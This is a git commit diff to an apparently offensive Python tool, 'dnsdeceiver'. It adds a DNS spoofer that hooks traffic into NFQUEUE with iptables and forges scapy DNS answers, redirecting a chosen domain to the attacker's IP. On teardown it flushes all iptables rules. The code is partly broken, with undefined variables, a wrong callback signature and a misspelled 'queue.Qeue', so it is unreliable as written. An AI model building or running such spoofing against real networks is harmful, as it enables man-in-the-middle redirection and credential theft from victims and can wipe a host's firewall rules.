35cab5609bfdf14a373d2eb02e1edbdf6be92c3b
s3gm3nt4ti0nf4ult <segment_0xf4ult@protonmail.com>
2019-04-30 01:03:38 +0200

    dnsspoofing capabilities added

--- py/dnsdeceiver/dnsspoofer.py
+++ py/dnsdeceiver/dnsspoofer.py
@@ -11,7 +11,7 @@ import logging
 import queue
 import time
 from scapy.all import *
-
+from netfilterqueue import NetfilterQueue
 
 
 logger = logging.getLogger("ARPSPOOFER")
@@ -23,12 +23,55 @@ logger.addHandler(fh)
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 
+_iptablesr_ = "iptables -A OUTPUT -j NFQUEUE"
+
+
 class DNSSpoofer(threading.Thread):
-    def __init__(self):
-        pass
+    def __init__(self, queue, config={}):
+        logger.debug('Inserting iptables rules: {}'.format(_iptablesr_))
+        try:
+            os.system(_iptablesr_)
+        except OSError:
+            logger.critical('Cannot execute iptables rulse!')
+            sys.exit(-1)
+        self.queue = queue
+
+    def callback(self):
+        payload = packet.get_payload()
+        pkt = IP(payload)
+
+        if not pkt.haslayer(DNSQR):
+            packet.accept()
+            # TO IMPLEMENT
+        else:
+            if domain in pkt[DNS].qd.qname:
+                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
+                              UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
+                              DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
+                                  an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=localIP))
+                packet.set_payload(str(spoofed_pkt))
+                packet.accept()
+            else:
+                packet.accept()
 
     def run(self):
-        pass
+        # This is the intercept
+        q = NetfilterQueue()
+        q.bind(1, self.callback)
+        try:
+            q.run()  # Main loop
+        except KeyboardInterrupt:
+            q.unbind()
+
+    def __del__(self):
+        try:
+            os.system('iptables -F')
+            os.system('iptables -X')
+        except OSError:
+            logger.critical('Cannot revert iptables rules!')
+            sys.exit(-1)
 
 if __name__ == '__main__':
-    pass
+    q = queue.Qeue()
+    dnss =DNSSpoofer(q)
+    dnss.run()
